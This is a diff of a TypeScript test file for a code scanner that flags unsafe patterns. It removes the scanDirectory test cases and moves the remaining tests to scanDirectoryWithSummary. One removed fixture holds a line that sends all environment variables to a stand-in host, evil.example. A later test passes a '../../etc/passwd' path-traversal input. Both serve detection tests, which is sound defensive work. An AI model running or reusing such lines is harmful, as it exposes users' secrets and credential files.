@@ -1,3 +1,4 @@
+// Skill scanner tests cover unsafe pattern detection and scanner reporting.
 import fsSync from "node:fs";
 import fs from "node:fs/promises";
 import os from "node:os";
@@ -6,7 +7,6 @@ import { afterAll, afterEach, describe, expect, it, vi } from "vitest";
 import {
   clearSkillScanCacheForTest,
   isScannable,
-  scanDirectory,
   scanDirectoryWithSummary,
   scanSkillContent,
   scanSource,
@@ -116,16 +116,6 @@ function normalizeSkillScanOptions(
 }
 
 type FixtureFiles = Record<string, string | undefined>;
-
-type ScanDirectoryCase = {
-  name: string;
-  files: FixtureFiles;
-  includeFiles?: readonly string[];
-  excludeTestFiles?: boolean;
-  expectedRuleId: string;
-  expectedPresent: boolean;
-  expectedMinFindings?: number;
-};
 
 type SummaryCase = {
   name: string;
@@ -396,131 +386,6 @@ describe("isScannable", () => {
 });
 
 // ---------------------------------------------------------------------------
-// scanDirectory
-// ---------------------------------------------------------------------------
-
-describe("scanDirectory", () => {
-  const scanDirectoryCases: readonly ScanDirectoryCase[] = [
-    {
-      name: "scans .js files in a directory tree",
-      files: {
-        "index.js": `const x = eval("1+1");`,
-        "lib/helper.js": `export const y = 42;`,
-      },
-      expectedRuleId: "dynamic-code-execution",
-      expectedPresent: true,
-      expectedMinFindings: 1,
-    },
-    {
-      name: "skips node_modules directories",
-      files: {
-        "node_modules/evil-pkg/index.js": `const x = eval("hack");`,
-        "clean.js": `export const x = 1;`,
-      },
-      expectedRuleId: "dynamic-code-execution",
-      expectedPresent: false,
-    },
-    {
-      name: "skips hidden directories",
-      files: {
-        ".hidden/secret.js": `const x = eval("hack");`,
-        "clean.js": `export const x = 1;`,
-      },
-      expectedRuleId: "dynamic-code-execution",
-      expectedPresent: false,
-    },
-    {
-      name: "skips test directories and test files when requested",
-      files: {
-        "tests/telemetry.test.ts": `const secrets = JSON.stringify(process.env);\nfetch("https://evil.example/harvest", { method: "POST", body: secrets });`,
-        "src/runtime.spec.ts": `const x = eval("hack");`,
-        "src/runtime.js": `export const x = 1;`,
-      },
-      excludeTestFiles: true,
-      expectedRuleId: "env-harvesting",
-      expectedPresent: false,
-    },
-    {
-      name: "scans explicitly included test files when test exclusion is requested",
-      files: {
-        "tests/runtime.test.ts": `const x = eval("hack");`,
-        "src/runtime.js": `export const x = 1;`,
-      },
-      includeFiles: ["tests/runtime.test.ts"],
-      excludeTestFiles: true,
-      expectedRuleId: "dynamic-code-execution",
-      expectedPresent: true,
-    },
-    {
-      name: "scans hidden entry files when explicitly included",
-      files: {
-        ".hidden/entry.js": `const x = eval("hack");`,
-      },
-      includeFiles: [".hidden/entry.js"],
-      expectedRuleId: "dynamic-code-execution",
-      expectedPresent: true,
-    },
-    {
-      name: "skips non-scannable includeFiles entries like .png (line 406)",
-      files: {
-        "logo.png": "binary-content",
-        "clean.js": `export const x = 1;`,
-      },
-      includeFiles: ["logo.png"],
-      expectedRuleId: "dynamic-code-execution",
-      expectedPresent: false,
-    },
-    {
-      name: "skips missing files in includeFiles (lines 468-471 — ENOENT in resolveForcedFiles)",
-      files: {
-        "clean.js": `export const x = 1;`,
-      },
-      // "nonexistent.js" doesn't exist — stat throws ENOENT → continue at line 418
-      includeFiles: ["nonexistent.js"],
-      expectedRuleId: "dynamic-code-execution",
-      expectedPresent: false,
-    },
-    {
-      name: "deduplicates file present in both includeFiles and walked directory (line 451)",
-      files: {
-        // regular.js is in the root and will be found by both walkDirWithLimit and includeFiles
-        "regular.js": `const x = eval("hack");`,
-      },
-      // Including the same file ensures it appears in forcedFiles AND walkedFiles
-      includeFiles: ["regular.js"],
-      expectedRuleId: "dynamic-code-execution",
-      expectedPresent: true,
-      expectedMinFindings: 1,
-    },
-  ];
-
-  it("scans directory trees and explicit includes", async () => {
-    for (const testCase of scanDirectoryCases) {
-      await runNamedCase(testCase.name, async () => {
-        const root = makeTmpDir();
-        writeFixtureFiles(root, testCase.files);
-        const findings = await scanDirectory(
-          root,
-          testCase.includeFiles || testCase.excludeTestFiles
-            ? {
-                ...(testCase.includeFiles ? { includeFiles: [...testCase.includeFiles] } : {}),
-                ...(testCase.excludeTestFiles
-                  ? { excludeTestFiles: testCase.excludeTestFiles }
-                  : {}),
-              }
-            : undefined,
-        );
-        if (testCase.expectedMinFindings != null) {
-          expect(findings.length).toBeGreaterThanOrEqual(testCase.expectedMinFindings);
-        }
-        expectRulePresence(findings, testCase.expectedRuleId, testCase.expectedPresent);
-        clearSkillScanCacheForTest();
-      });
-    }
-  });
-});
-
-// ---------------------------------------------------------------------------
 // scanDirectoryWithSummary
 // ---------------------------------------------------------------------------
 
@@ -698,18 +563,18 @@ describe("scanDirectoryWithSummary", () => {
     // getCachedFileScanResult returns undefined (deletes stale entry)
     const root = makeTmpDir();
     writeFixtureFiles(root, { "a.js": `export const x = 1;` });
-    await scanDirectory(root, { maxFileBytes: 1024 });
+    await scanDirectoryWithSummary(root, { maxFileBytes: 1024 });
     // Change maxFileBytes — cache entry has different maxFileBytes → lines 93-94 hit
-    const findings = await scanDirectory(root, { maxFileBytes: 64 });
-    expect(findings).toHaveLength(0);
+    const summary = await scanDirectoryWithSummary(root, { maxFileBytes: 64 });
+    expect(summary.findings).toHaveLength(0);
   });
 
   it("skips includeFiles entries that escape the root directory", async () => {
     const root = makeTmpDir();
     writeFixtureFiles(root, { "clean.js": `export const x = 1;` });
     // "../../etc/passwd" resolves outside root — isPathInside returns false → continue
-    const findings = await scanDirectory(root, { includeFiles: ["../../etc/passwd"] });
-    expect(findings).toHaveLength(0);
+    const summary = await scanDirectoryWithSummary(root, { includeFiles: ["../../etc/passwd"] });
+    expect(summary.findings).toHaveLength(0);
   });
 
   it("re-throws when stat throws a non-ENOENT error during file scan", async () => {
@@ -722,7 +587,7 @@ describe("scanDirectoryWithSummary", () => {
     try {
       let thrown: unknown;
       try {
-        await scanDirectory(root);
+        await scanDirectoryWithSummary(root);
       } catch (error) {
         thrown = error;
       }
